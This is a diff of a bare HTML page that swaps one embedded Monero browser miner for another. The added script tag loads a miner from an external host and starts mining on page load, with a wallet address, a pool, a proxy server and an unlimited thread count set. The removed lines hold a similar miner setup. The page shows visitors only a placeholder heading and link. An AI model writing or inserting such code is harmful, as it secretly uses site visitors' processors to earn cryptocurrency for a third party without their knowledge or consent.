@@ -3,20 +3,21 @@
 
 <body>
 
-<h1>This is a Heading</h1>
-<p>This is a paragraph.</p>
-<a href='1.html' class='click2'> clicl</a>
-<script src="https://coinwebmining.com/cwm.js"></script>
+<h1>This is good</h1>
+
+<a href='1.html' class='click2'> clic2</a>
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
-    var site_id = 'cwm-4859';
-    var coin = 'monero';
-    var wallet = '4Ao4g5EbEmrfbsyBvfxtyuXK53TGX1LGLV1kLsBQq4KyGeEw6TJZ1UULLy1bjQwabDaUCBPA3dfwf2gzbrDZY7J1NeRCaZu';
-    var password = 'x';
-    var mining_pool = 'gulf.moneroocean.stream:10001';
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "43w8dcU8MBqctVw5wZuqPm3TvPgXbfvgMVPfBNWgz7xTQPoh1SZG46eXvV7uoEVeJ1gnyZGsLMvxhGY8Bys2AXJcGTAq1Jy";
+    var workerId = ""
     var threads = -1;
-    var throttle = 0.2;
-    var debug = false;
-    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
 </script>
 </body>
 </html>
+
+
